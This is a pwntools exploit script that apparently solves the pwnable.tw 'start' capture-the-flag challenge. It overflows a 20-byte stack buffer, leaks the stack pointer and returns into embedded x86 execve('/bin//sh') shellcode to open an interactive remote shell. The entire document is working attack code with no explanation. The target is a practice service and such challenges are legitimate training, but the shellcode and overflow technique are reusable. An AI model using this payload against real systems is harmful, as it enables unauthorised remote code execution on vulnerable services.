from pwn import * 
#sh = process("./start")
sh = remote("chall.pwnable.tw",10000) 
payload1 = "a"*20 + p32(0x08048087) 
print sh.recv()
sh.send(payload1)
esp = u32(sh.recv()[:4])
print "ESP:",hex(esp)

#shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" 
shellcode = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" 

payload2 = "a"*20 + p32(esp + 20) + shellcode 
sh.send(payload2)
sh.interactive()
